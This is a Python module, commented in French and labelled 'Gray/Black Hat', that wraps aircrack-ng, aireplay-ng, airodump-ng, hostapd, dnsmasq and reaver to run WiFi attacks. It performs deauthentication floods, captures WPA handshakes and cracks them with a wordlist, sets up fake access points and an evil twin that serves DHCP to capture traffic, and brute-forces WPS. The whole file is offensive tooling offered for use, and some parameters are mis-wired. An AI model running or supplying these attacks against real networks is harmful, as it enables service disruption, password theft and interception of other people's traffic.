#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
📡 WIFI ATTACKS - Module d'attaques WiFi avancées
Gray/Black Hat - Wifite + Aircrack-ng + Hashcat
"""

import os
import subprocess
import threading
import time
import json
from datetime import datetime

class WifiAttacks:
    def __init__(self):
        self.attack_results = []
        self.active_attacks = []
        self.captured_handshakes = []
        
    def scan_wifi_networks(self):
        """Scan des réseaux WiFi"""
        print("📡 Scan des réseaux WiFi...")
        
        try:
            # Utiliser iwlist pour scanner
            result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
            
            networks = []
            current_network = {}
            
            for line in result.stdout.split('\n'):
                if 'ESSID:' in line:
                    if current_network:
                        networks.append(current_network)
                    current_network = {'essid': line.split('"')[1] if '"' in line else 'Unknown'}
                elif 'Channel:' in line:
                    current_network['channel'] = line.split(':')[1].strip()
                elif 'Quality=' in line:
                    current_network['quality'] = line.split('=')[1].split()[0]
                elif 'Encryption key:' in line:
                    current_network['encryption'] = 'WEP' if 'on' in line else 'WPA/WPA2'
                    
            if current_network:
                networks.append(current_network)
                
            self.attack_results.append({
                'type': 'wifi_scan',
                'networks': networks,
                'timestamp': datetime.now().isoformat()
            })
            
            return networks
            
        except Exception as e:
            print(f"❌ Erreur scan WiFi: {e}")
            return []
            
    def deauth_attack(self, target_mac, interface="wlan0"):
        """Attaque de déauthentification"""
        print(f"💀 Deauth attack sur {target_mac}")
        
        try:
            # Utiliser aireplay-ng pour deauth
            cmd = [
                'aireplay-ng',
                '--deauth', '0',
                '-a', target_mac,
                interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.active_attacks.append({
                'type': 'deauth',
                'target': target_mac,
                'process': process,
                'start_time': datetime.now().isoformat()
            })
            
            return True
            
        except Exception as e:
            print(f"❌ Erreur deauth: {e}")
            return False
            
    def capture_handshake(self, target_ssid, interface="wlan0"):
        """Capture de handshake WPA"""
        print(f"🤝 Capture handshake: {target_ssid}")
        
        try:
            # Créer le dossier captures
            os.makedirs('captures', exist_ok=True)
            
            # Nom du fichier de capture
            capture_file = f"captures/{target_ssid}_handshake.cap"
            
            # Commande airodump-ng
            cmd = [
                'airodump-ng',
                '-c', '1,6,11',  # Canaux
                '--bssid', target_ssid,
                '-w', capture_file,
                interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.active_attacks.append({
                'type': 'handshake_capture',
                'target': target_ssid,
                'process': process,
                'capture_file': capture_file,
                'start_time': datetime.now().isoformat()
            })
            
            return capture_file
            
        except Exception as e:
            print(f"❌ Erreur capture handshake: {e}")
            return None
            
    def crack_wpa_handshake(self, handshake_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Crack du handshake WPA"""
        print(f"🔓 Crack handshake: {handshake_file}")
        
        try:
            # Utiliser aircrack-ng
            cmd = [
                'aircrack-ng',
                handshake_file,
                '-w', wordlist
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if 'KEY FOUND!' in result.stdout:
                # Extraire le mot de passe
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND!' in line:
                        password = line.split('[')[1].split(']')[0]
                        
                        self.captured_handshakes.append({
                            'file': handshake_file,
                            'password': password,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        return password
                        
            return None
            
        except Exception as e:
            print(f"❌ Erreur crack handshake: {e}")
            return None
            
    def create_fake_ap(self, ssid, interface="wlan0"):
        """Crée un point d'accès factice"""
        print(f"📡 Création AP factice: {ssid}")
        
        try:
            # Configurer l'interface en mode AP
            subprocess.run(['ifconfig', interface, 'down'])
            subprocess.run(['iwconfig', interface, 'mode', 'master'])
            subprocess.run(['ifconfig', interface, 'up'])
            
            # Créer le fichier de configuration hostapd
            config_content = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
"""
            
            with open('hostapd.conf', 'w') as f:
                f.write(config_content)
                
            # Démarrer hostapd
            cmd = ['hostapd', 'hostapd.conf']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.active_attacks.append({
                'type': 'fake_ap',
                'ssid': ssid,
                'process': process,
                'start_time': datetime.now().isoformat()
            })
            
            return True
            
        except Exception as e:
            print(f"❌ Erreur création AP factice: {e}")
            return False
            
    def evil_twin_attack(self, target_ssid, interface="wlan0"):
        """Attaque Evil Twin"""
        print(f"👿 Evil Twin attack: {target_ssid}")
        
        try:
            # Créer un AP avec le même SSID
            fake_ssid = f"{target_ssid}_FREE"
            
            # Configurer l'interface
            subprocess.run(['ifconfig', interface, 'down'])
            subprocess.run(['iwconfig', interface, 'mode', 'master'])
            subprocess.run(['ifconfig', interface, 'up'])
            
            # Configuration hostapd pour Evil Twin
            config_content = f"""
interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
"""
            
            with open('evil_twin.conf', 'w') as f:
                f.write(config_content)
                
            # Démarrer hostapd
            cmd = ['hostapd', 'evil_twin.conf']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Configurer DHCP pour capturer le trafic
            self.setup_dhcp_server(interface)
            
            self.active_attacks.append({
                'type': 'evil_twin',
                'target': target_ssid,
                'process': process,
                'start_time': datetime.now().isoformat()
            })
            
            return True
            
        except Exception as e:
            print(f"❌ Erreur Evil Twin: {e}")
            return False
            
    def setup_dhcp_server(self, interface):
        """Configure un serveur DHCP pour capturer le trafic"""
        try:
            # Configuration dnsmasq
            dnsmasq_config = f"""
interface={interface}
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
"""
            
            with open('dnsmasq.conf', 'w') as f:
                f.write(dnsmasq_config)
                
            # Démarrer dnsmasq
            cmd = ['dnsmasq', '-C', 'dnsmasq.conf']
            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
        except Exception as e:
            print(f"❌ Erreur DHCP: {e}")
            
    def wps_attack(self, target_bssid, interface="wlan0"):
        """Attaque WPS"""
        print(f"🔑 WPS attack: {target_bssid}")
        
        try:
            # Utiliser reaver pour WPS
            cmd = [
                'reaver',
                '-i', interface,
                '-b', target_bssid,
                '-vv'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.active_attacks.append({
                'type': 'wps_attack',
                'target': target_bssid,
                'process': process,
                'start_time': datetime.now().isoformat()
            })
            
            return True
            
        except Exception as e:
            print(f"❌ Erreur WPS: {e}")
            return False
            
    def stop_all_attacks(self):
        """Arrête toutes les attaques"""
        for attack in self.active_attacks:
            if 'process' in attack:
                attack['process'].terminate()
                
        self.active_attacks = []
        print("⏹️ Toutes les attaques WiFi arrêtées")
        
    def get_attack_results(self):
        """Retourne les résultats d'attaques"""
        return self.attack_results
        
    def get_captured_handshakes(self):
        """Retourne les handshakes capturés"""
        return self.captured_handshakes
        
    def export_wifi_data(self, filename):
        """Exporte les données WiFi"""
        data = {
            'attack_results': self.attack_results,
            'captured_handshakes': self.captured_handshakes,
            'active_attacks': len(self.active_attacks)
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
            
        print(f"📤 Données WiFi exportées: {filename}") 